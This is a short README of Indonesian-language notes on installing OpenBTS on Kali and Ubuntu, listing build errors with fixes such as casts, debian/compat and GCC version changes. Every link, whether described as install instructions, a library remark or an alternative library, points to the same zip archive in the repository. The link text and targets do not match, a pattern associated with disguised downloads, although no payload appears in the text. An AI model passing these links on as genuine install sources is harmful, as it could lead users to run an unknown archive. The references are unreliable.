# OpenBTS-notes
🇮🇩  install @kali-linux kernel 4.x.x
> installasi openbts pada ubuntu > 16 dan kali,  serasa seperti berton-ton besi di kepala

## OpenBTS install

### Basic Installation
ikuti instruksi om Onno
https://raw.githubusercontent.com/fatahfd/OpenBTS-notes/master/infraction/OpenBTS-notes.zip

### error pada libcoredumper

> remark libcoredumper pada https://raw.githubusercontent.com/fatahfd/OpenBTS-notes/master/infraction/OpenBTS-notes.zip
> gunakan alternative https://raw.githubusercontent.com/fatahfd/OpenBTS-notes/master/infraction/OpenBTS-notes.zip

### error macro "gettid"
> remark deklarasi gettid di commonlibs/Logger.h ~~(I dont know what i'm doing but it works :) )~~

### error  a53.h not found
> make install pada liba53

### error  Please specify the compatibility level in debian/compat
> create file debian/compat, isi file dengan magic word  "9" 
> echo "9" > debian/compat

### error ‘unsigned int’ to ‘void*’ dialogid
> cast: (void*)&dialogId

### error invalid conversion OrtpLogFunc
> ~???~

### error: no type named ‘type’ in ‘struct std::enable_if<false, std::basic_ostream<char>&>’
> ~tambahkan _using namespace std;_ di ostream~
  > switch ke GCC4.9 atau GCC5
